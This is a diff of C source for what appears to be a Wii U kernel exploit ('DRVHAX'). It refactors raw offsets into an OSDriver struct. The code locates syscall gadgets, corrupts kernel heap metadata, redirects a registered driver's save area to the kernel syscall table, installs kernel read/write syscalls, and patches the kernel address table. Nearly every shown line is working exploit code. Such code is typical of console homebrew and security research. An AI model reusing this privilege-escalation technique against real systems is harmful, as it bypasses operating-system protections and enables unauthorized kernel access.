@@ -43,7 +43,7 @@ void _start()
 
 	/* OSDriver functions */
 	uint32_t reg[] = {0x38003200, 0x44000002, 0x4E800020};
-	uint32_t (*Register)(char *driver_name, uint32_t name_length, void *buf1, void *buf2) = find_gadget(reg, 0xc, (uint32_t) __PPCExit);
+	OSDriver (*Register)(char *driver_name, uint32_t name_length, void *buf1, void *buf2) = find_gadget(reg, 0xc, (uint32_t) __PPCExit);
 	uint32_t dereg[] = {0x38003300, 0x44000002, 0x4E800020};
 	uint32_t (*Deregister)(char *driver_name, uint32_t name_length) = find_gadget(dereg, 0xc, (uint32_t) __PPCExit);
 	uint32_t copyfrom[] = {0x38004700, 0x44000002, 0x4E800020};
@@ -58,7 +58,7 @@ void _start()
 	OSDynLoad_FindExport(gx2_handle, 0, "GX2Flush", &GX2Flush);
 
 	/* Allocate space for DRVHAX */
-	uint32_t *drvhax = OSAllocFromSystem(0x4c, 4);
+	OSDriver *drvhax = OSAllocFromSystem(sizeof(OSDriver), 4);
 
 	/* Set the kernel heap metadata entry */
 	uint32_t *metadata = (uint32_t*) (KERN_HEAP + METADATA_OFFSET + (0x02000000 * METADATA_SIZE));
@@ -128,7 +128,7 @@ void _start()
 	Register(drvname, 6, NULL, NULL);
 
 	/* Modify its save area to point to the kernel syscall table */
-	drvhax[0x44/4] = KERN_SYSCALL_TBL + (0x34 * 4);
+	drvhax->save_area = (uint32_t*)KERN_SYSCALL_TBL + (0x34 * 4);
 
 	/* Use DRVHAX to install the read and write syscalls */
 	uint32_t syscalls[2] = {KERN_CODE_READ, KERN_CODE_WRITE};
@@ -136,7 +136,7 @@ void _start()
 	
 	/* Clean up the heap and driver list so we can exit */
 	kern_write((void*)(KERN_HEAP + STARTID_OFFSET), 0);
-	kern_write((void*)KERN_DRVPTR, drvhax[0x48/4]);
+	kern_write((void*)KERN_DRVPTR, (uint32_t)drvhax->next);
 
 	/* Modify the kernel address table and exit */
 	kern_write(KERN_ADDRESS_TBL + 0x12, 0x31000000);
